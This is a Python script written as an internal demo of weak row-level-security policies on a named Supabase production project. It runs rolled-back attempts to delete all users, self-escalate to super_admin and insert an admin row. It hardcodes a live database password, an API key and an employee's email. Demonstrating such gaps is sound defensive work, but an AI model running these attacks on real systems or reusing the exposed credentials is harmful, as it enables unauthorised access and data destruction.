#!/usr/bin/env python3
"""
RLS security DEMO for the team meeting — agilitylms.tech (project jpjrhpagjevjkfezgnve).

Two acts, both 100% SAFE:
  ACT 1 (no login):   an anonymous visitor reads internal config — no credentials at all.
  ACT 2 (loaded gun): a training EMPLOYEE attempts delete-all-users + self-promote to admin.
                      Every attempt runs inside ONE transaction that is ROLLED BACK.
                      Nothing is ever committed. The point is to show the attacks are stopped
                      ONLY by a restrictive policy + a trigger + a foreign key — load-bearing
                      controls that are undocumented and one careless migration from gone.

Just run it:   python demo.py     (press Enter to advance between steps)

NOTE: the DB password below is the one used during testing — ROTATE IT after the meeting
(Supabase -> Settings -> Database -> Reset password). It is hardcoded only for demo convenience.
"""
import os
import json
from urllib.parse import quote

import requests
import psycopg  # pip install requests "psycopg[binary]"

# ----------------------------- CONFIG (hardcoded for the demo) -----------------------------
SUPABASE_URL = "https://jpjrhpagjevjkfezgnve.supabase.co"
ANON_KEY = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpwanJocGFnamV2amtmZXpnbnZlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MzQxMDAsImV4cCI6MjA5NDAxMDEwMH0."
    "hV90FeXDE55DnrfT7tSy4I-8H8cCKXuF66reGqexm30"
)
DB_HOST = "aws-1-ap-northeast-2.pooler.supabase.com"      # found during the region sweep
# Reads the env var SUPABASE_DB_PASSWORD if set (keeps the new password out of this file);
# falls back to the hardcoded value otherwise.
DB_PASSWORD = os.environ.get("SUPABASE_DB_PASSWORD", "TN@qwe4321n")  # ROTATE after the meeting
PROJECT_REF = "jpjrhpagjevjkfezgnve"

# The presenter's own employee identity (a normal, non-admin account)
USER_UID = "9ab40992-39ac-42dd-ad12-caf751c506c9"
USER_EMAIL = "preet.d@agilitytech.ai"

DB_URL = f"postgresql://postgres.{PROJECT_REF}:{quote(DB_PASSWORD, safe='')}@{DB_HOST}:6543/postgres"
ANON_HEADERS = {"apikey": ANON_KEY, "Authorization": f"Bearer {ANON_KEY}"}


def pause(msg="\n[ Press Enter to continue... ]"):
    try:
        input(msg)
    except EOFError:
        pass


def banner(text):
    print("\n" + "=" * 78)
    print(text)
    print("=" * 78)


# ----------------------------------- ACT 1 (no login) --------------------------------------
def act1_anonymous_read():
    banner("ACT 1 — NO LOGIN REQUIRED: an anonymous visitor reads internal data")
    print("Using only the public anon key — the same request any browser on the internet")
    print("could make against our API. No username, no password, no session.\n")
    pause()

    for table in ("system_config",):
        r = requests.get(
            f"{SUPABASE_URL}/rest/v1/{table}",
            headers={**ANON_HEADERS, "Prefer": "count=exact"},
            params={"select": "*", "limit": "8"},
            timeout=15,
        )
        print(f"\nGET /rest/v1/{table}  ->  HTTP {r.status_code}")
        if r.status_code in (200, 206):
            total = r.headers.get("Content-Range", "?/?").split("/")[-1]
            rows = r.json()
            print(f"  >>> anonymous user read {len(rows)} row(s) (table total: {total}):")
            for row in rows:
                print(f"      {row}")
        else:
            print(f"  blocked: {r.text[:160]}")
    print("\nTakeaway: system_config has a `USING (true)` SELECT policy granted to PUBLIC,")
    print("so anyone — logged in or not — can read it. (Low severity here: it's config,")
    print("not secrets. But it's the wrong default, and shows policies aren't reviewed.)")
    pause()


# ----------------------------------- ACT 2 (loaded gun) ------------------------------------
def _build_super_admin_insert(conn):
    """Construct an INSERT that satisfies NOT NULL columns, role=super_admin, random id."""
    import uuid
    from datetime import datetime, date, timezone
    with conn.cursor() as c:
        c.execute("""
            select column_name, is_nullable, column_default, data_type
            from information_schema.columns
            where table_schema='public' and table_name='users' order by ordinal_position;
        """)
        cols = c.fetchall()

    def sample(dt):
        dt = dt.lower()
        if "char" in dt or "text" in dt: return "demo"
        if "bool" in dt: return False
        if "int" in dt or "numeric" in dt or "double" in dt or "real" in dt: return 0
        if "timestamp" in dt: return datetime.now(timezone.utc)
        if "date" in dt: return date.today()
        if "json" in dt: return "{}"
        if "uuid" in dt: return str(uuid.uuid4())
        return "demo"

    vals = {}
    for name, nullable, default, dtype in cols:
        if name == "id": vals["id"] = str(uuid.uuid4())
        elif name == "role": vals["role"] = "super_admin"
        elif name == "email": vals["email"] = f"attacker-{uuid.uuid4()}@evil.invalid"
        elif nullable == "NO" and default is None: vals[name] = sample(dtype)
    return vals


def act2_loaded_gun():
    banner("ACT 2 — A TRAINING EMPLOYEE ATTACKS (everything is rolled back)")
    print(f"Acting as: {USER_EMAIL}  (role: employee, status: training)")
    print("We assume this employee's RLS context exactly — no admin shortcuts.")
    print("All three attacks run inside ONE transaction that we ROLL BACK at the end.\n")
    pause()

    conn = psycopg.connect(DB_URL, connect_timeout=15)
    conn.autocommit = False
    claims = json.dumps({"sub": USER_UID, "role": "authenticated"})
    try:
        cur = conn.cursor()
        cur.execute("SELECT set_config('request.jwt.claims', %s, true)", (claims,))
        cur.execute("SET LOCAL ROLE authenticated")  # drop to a normal logged-in user
        cur.execute("SELECT email, role FROM users WHERE id = auth.uid()")
        me = cur.fetchone()
        print(f"Confirmed identity inside DB: {me[0]} / role={me[1]}")
        pause()

        # ---- Attack 1: delete every user ----
        print("\n--- ATTACK 1: DELETE FROM users  (try to wipe the entire company) ---")
        print("Policy `users_delete` literally says: DELETE to authenticated USING (true).")
        cur.execute("SAVEPOINT a1")
        try:
            cur.execute("DELETE FROM users")
            print(f"  Rows deleted: {cur.rowcount}")
            if cur.rowcount == 0:
                print("  >>> STOPPED at 0 rows — a RESTRICTIVE policy (users_no_delete) overrides")
                print("      the permissive one. Remove that ONE policy and this wipes everyone.")
        except Exception as e:
            cur.execute("ROLLBACK TO a1")
            print(f"  >>> BLOCKED: {str(e).splitlines()[0]}")
        pause()

        # ---- Attack 2: promote self to super_admin ----
        print("\n--- ATTACK 2: UPDATE users SET role='super_admin' WHERE id = me ---")
        print("Policy `users_update_own` allows updating my own row with NO column limits.")
        cur.execute("SAVEPOINT a2")
        try:
            cur.execute("UPDATE users SET role='super_admin' WHERE id = auth.uid()")
            cur.execute("SELECT role FROM users WHERE id = auth.uid()")
            print(f"  Role now: {cur.fetchone()[0]}")
            print("  >>> ESCALATED (rolled back). Nothing stopped me!")
        except Exception as e:
            cur.execute("ROLLBACK TO a2")
            print(f"  >>> BLOCKED: {str(e).splitlines()[0]}")
            print("      A BEFORE UPDATE trigger (trg_prevent_privilege_escalation) caught it.")
            print("      Remove that ONE trigger and any employee becomes super_admin.")
        pause()

        # ---- Attack 3: insert a brand-new admin account ----
        print("\n--- ATTACK 3: INSERT a fresh super_admin row into users ---")
        print("Policy `users_insert` says: INSERT to authenticated WITH CHECK (true).")
        cur.execute("SAVEPOINT a3")
        try:
            vals = _build_super_admin_insert(conn)
            cols = ", ".join(f'"{k}"' for k in vals)
            ph = ", ".join(["%s"] * len(vals))
            cur.execute(f"INSERT INTO users ({cols}) VALUES ({ph})", list(vals.values()))
            print(f"  Inserted {cur.rowcount} admin row (rolled back). Nothing stopped me!")
        except Exception as e:
            cur.execute("ROLLBACK TO a3")
            print(f"  >>> BLOCKED: {str(e).splitlines()[0]}")
            print("      A foreign key (users_id_fkey -> auth.users) caught it.")
    finally:
        conn.rollback()  # <<< nothing is ever committed
        conn.close()
        print("\n*** Transaction ROLLED BACK. Zero rows changed. ***")

    banner("THE POINT")
    print("Every attack was stopped — but each by a SINGLE, silent, undocumented control:")
    print("  • delete-everyone   -> one RESTRICTIVE policy")
    print("  • self-promote      -> one BEFORE UPDATE trigger")
    print("  • inject-an-admin   -> one foreign key")
    print("The base policies (`USING true`, `WITH CHECK true`) are wide open. We are one")
    print("dropped trigger / altered policy away from full compromise — with no test")
    print("catching it. Ask: do we have RLS tests? Who reviews policy changes?")


def main():
    print("RLS SECURITY DEMO  —  agilitylms.tech")
    print("(read-only + fully rolled back; safe to run against production)")
    act1_anonymous_read()
    act2_loaded_gun()
    print("\nDemo complete. Nothing was modified. Remember to rotate the DB password.")


if __name__ == "__main__":
    main()
